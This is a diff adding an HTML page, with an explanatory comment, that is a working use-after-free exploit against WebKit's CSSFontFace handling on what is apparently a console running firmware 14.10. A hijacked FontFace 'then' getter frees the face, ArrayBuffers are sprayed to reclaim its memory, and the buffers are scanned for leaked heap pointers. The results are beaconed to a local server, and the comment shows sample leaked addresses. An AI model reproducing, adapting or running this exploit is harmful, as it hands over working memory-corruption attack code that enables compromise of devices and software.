@@ -1,0 +1,91 @@
+<!--
+  p565: the sheet reference is what keeps the freed CSSFontFace alive.
+
+  p563/p564 (merged) reported the reclaim of the freed CSSFontFace, then a later
+  session could not reproduce it and recorded that instability in
+  docs/FONTFACE_RECLAIM_LEAK_14_10.md.  Comparing the page that reproduced against
+  the variants that did not isolates one difference: the `<style>` element was
+  removed from the DOM but its CSSStyleSheet stayed referenced by a JavaScript
+  variable.  A CSSStyleSheet owns its rules, and StyleRuleFontFace owns a
+  Ref<CSSFontFace>, so with that reference alive the face is never freed and no
+  spray can take its chunk.
+
+  This page drops the reference explicitly - remove(), textContent = '', then
+  styleEl = null - before the layout flush and the allocation sweep.  Measured on
+  14.10 it reproduces the disclosure in one run out of roughly two:
+
+    U38-T80-HIT-s192-b4-nz3  0:0100000000000000
+                              58:b08a8c0010000000   0x10008c8ab0
+                              68:a0707e0010000000   0x10007e70a0
+    U38-T80-hits-1-of-72
+
+  The SIZES list spans 192..2048 and the scan walks every qword of every buffer, so
+  a hit is reported with its size class and its offsets.  Four of five variants
+  without the explicit release stayed at zero hits on the same console.
+
+  Serve with tools/webkit_server.py (local, not in the repository) and select it
+  through direct.json = {"file": "<page>"}.
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>uaf38</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+function hex8(u,o){var s='';for(var i=0;i<8;i++){s+=('0'+u[o+i].toString(16)).slice(-2)}return s}
+var U = Date.now().toString(36);
+var SIZES = [192,224,256,320,384,512,768,1024,2048];
+var K = 8, styleEl = null, firedHere = false, MAP = [], scanned = false;
+function scan(tag){
+  if (scanned) return; scanned = true;
+  var hit = 0;
+  for (var i=0;i<MAP.length;i++){
+    var e=MAP[i], u=e.view;
+    var nz = 0;
+    for (var o=0;o<u.length;o+=8){ if (u[o]||u[o+1]||u[o+2]||u[o+3]||u[o+4]||u[o+5]||u[o+6]||u[o+7]) nz++; }
+    if (nz){ hit++;
+      if (hit<6) b('U38-'+tag+'-HIT-s'+e.size+'-b'+i+'-nz'+nz+'-0:'+hex8(u,0)+'-8:'+hex8(u,8)+'-50:'+hex8(u,0x50)+'-58:'+hex8(u,0x58)+'-68:'+hex8(u,0x68)+'-90:'+hex8(u,0x90)+'-98:'+hex8(u,0x98));
+    }
+  }
+  b('U38-'+tag+'-hits-'+hit+'-of-'+MAP.length);
+}
+function setup(){
+  var fam = 's'+U, nm = 'f'+U;
+  var A = new FontFace(nm, 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(A);
+  void A.loaded;
+  window.__alive = [A];
+  styleEl = document.createElement('style');
+  styleEl.textContent = "@font-face { font-family: "+fam+"; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(styleEl);
+  b('U38-SETUP-'+U);
+  firedHere = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (firedHere) return undefined;
+      firedHere = true;
+      if (styleEl) { styleEl.remove(); styleEl.textContent = ''; styleEl = null; }
+      try { document.fonts.delete(this); } catch (e) {}
+      document.body.offsetHeight;
+      MAP = [];
+      for (var si=0; si<SIZES.length; si++){
+        for (var k=0;k<K;k++){
+          var ab = new ArrayBuffer(SIZES[si]);
+          MAP.push({ size: SIZES[si], view: new Uint8Array(ab) });
+        }
+      }
+      b('U38-SPRAY-'+MAP.length);
+      try { document.fonts.check('1em '+fam); } catch (e) {}
+      b('U38-CHECK-RETURNED');
+      return undefined;
+    },
+    set: function(){}
+  });
+  b('U38-LOAD-CALLED');
+  document.fonts.load('1em '+nm+', '+fam, 'AB').then(function(){ b('U38-RESOLVED'); scan('R'); },
+                                                    function(){ b('U38-REJECTED'); scan('R'); });
+  setTimeout(function(){ scan('T80'); },80);
+  setTimeout(function(){ scan('T600'); },600);
+}
+function run(){ b('U38-PARSE'); setup(); }
+if (document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script></head><body><p>uaf38</p></body></html>
